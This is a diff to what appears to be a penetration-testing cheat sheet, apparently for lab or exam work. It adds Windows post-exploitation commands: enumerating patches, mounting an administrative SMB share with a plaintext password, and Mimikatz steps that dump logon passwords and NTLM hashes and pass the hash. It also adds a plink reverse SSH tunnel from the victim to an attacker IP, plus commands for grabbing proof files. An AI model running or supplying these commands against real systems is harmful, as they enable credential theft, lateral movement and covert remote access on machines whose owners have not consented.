@@ -112,6 +112,23 @@ Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "sv
 tasklist /v /fi "username eq system"
 
 
+#Find out patches are installed
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+
+
+
+#############################
+#### ACCESSING SMB SHARE ####
+#############################
+#view shares
+net share
+
+#mount share 
+NET USE Z: \\ComputerName\C$ SecretPassword /USER:alice
+
+#delete mapped share
+net use Z: /delete
+
 ########################
 #### CODE COMPILING ####
 ########################
@@ -233,4 +250,46 @@ pure-pw mkdb
 export SMBHASH=aad3b435b51404eeaad3b435b51404ee:B74242F37E4731239A9DWKD09W9KD
 pth-winexe -U administrator% //10.11.1.49 cmd
 
-#using mimikatz
+
+######## MIMIKATS ##########
+#need administrator rights!
+#good to perform this first (may need to provide -accepteula option)
+psexec.exe -S -I -D cmd.exe 
+
+#pre run checks!
+##Without rights to access lsass process, all commands will fail with an error like this: ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005) (except when working with a minidump)
+privilege::debug 
+log sekurlsa.log
+
+#Get passwords/ntlm
+sekurlsa::logonpasswords
+
+#PASS THE HASH!
+sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a
+
+
+#########################
+##### SSH TUNNELING #####
+#########################
+
+#reverse ssh from victim machine back to kali
+plink -l root -pw secretpassword 208.88.127.99 R 3390:127.0.0.1:3389
+
+
+
+
+
+
+
+
+====================
+
+PROOF:
+
+* Linux proof
+
+hostname && whoami && cat proof.txt && /sbin/ifconfig
+
+* Windows proof
+
+hostname && whoami.exe && type proof.txt && ipconfig /all
